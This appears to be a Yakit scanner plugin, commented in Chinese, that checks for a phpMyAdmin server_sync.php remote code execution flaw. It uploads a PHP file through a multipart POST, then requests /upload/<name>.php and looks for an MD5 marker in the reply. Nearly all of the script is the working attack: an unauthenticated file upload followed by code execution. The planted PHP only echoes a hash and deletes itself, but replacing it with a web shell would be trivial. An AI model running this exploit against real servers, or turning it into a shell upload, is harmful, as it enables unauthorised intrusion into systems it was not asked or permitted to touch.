yakit.AutoInitYakit()

handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    // 随机生成文件名和 MD5 校验值
    filename = randstr(8)
    r1 = randstr(8)
    flag = codec.Md5(r1)

    // 发送第一个请求，上传PHP文件到目标服务器
    packet1 = `POST /phpmyadmin/server_sync.php HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Accept-Encoding: gzip
Content-Length: 300

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="{{params(filename)}}.php"
Content-Type: application/x-php

<?php echo md5('{{params(r1)}}'); unlink(__FILE__); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--`

    // 发送上传的请求
    rsp, req, _ = poc.HTTP(packet1,
        poc.params({"target": addr, "filename": filename, "r1": r1}),
        poc.https(isTls),
        poc.redirectTimes(0),
    )

    // 发送第二个请求，执行刚刚上传的PHP文件
    packet2 = `GET /upload/{{params(filename)}}.php HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept-Encoding: gzip`

    rsp1, req1, _ = poc.HTTP(packet2,
        poc.params({"target": addr, "filename": filename}),
        poc.https(isTls),
        poc.redirectTimes(0),
    )

    // 检查响应中是否包含上传的文件执行结果 (即MD5值)
    if str.MatchAllOfSubString(rsp1, `HTTP/1.1 200`, flag) {
        yakit.Info("%v found phpMyAdmin server_sync.php 远程命令执行漏洞", addr)
        risk.NewRisk(
            addr,
            risk.title("phpMyAdmin server_sync.php 远程命令执行漏洞"),
            risk.severity("critical"),
            risk.titleVerbose("phpMyAdmin server_sync.php 远程命令执行漏洞"),
            risk.request(string(req)),
            risk.response(string(rsp)),
            risk.cve("no cve"),
        )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // 处理匹配结果
    if !result.IsOpen() {
        return
    }

    // 检查HTTP流量是否存在，且端口开放
    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }
}
